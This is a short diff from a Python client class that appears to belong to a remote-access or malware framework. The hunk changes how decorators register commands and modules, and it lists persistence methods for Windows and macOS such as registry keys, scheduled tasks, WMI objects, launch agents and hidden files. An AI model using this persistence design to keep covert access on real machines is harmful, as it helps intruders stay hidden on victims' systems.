@@ -334,11 +334,11 @@ class Client(object):
 
 # ----------------- PUBLIC FUNCTIONS --------------------------
 
-    def command(fx, cx=self.cmds):
+    def command(fx, cx=__command__):
         cx.update({ fx.func_name : fx })
         return fx
 
-    def modules(fx, mx=self.mods):
+    def modules(fx, mx=__modules__):
         if fx.func_name is 'persistence':
             fx.platforms = ['win32','darwin']
             fx.options = {'methods': ['registry key', 'scheduled task', 'wmi object', 'startup file', 'hidden file'] if os.name is 'nt' else ['launch agent', 'hidden file']}
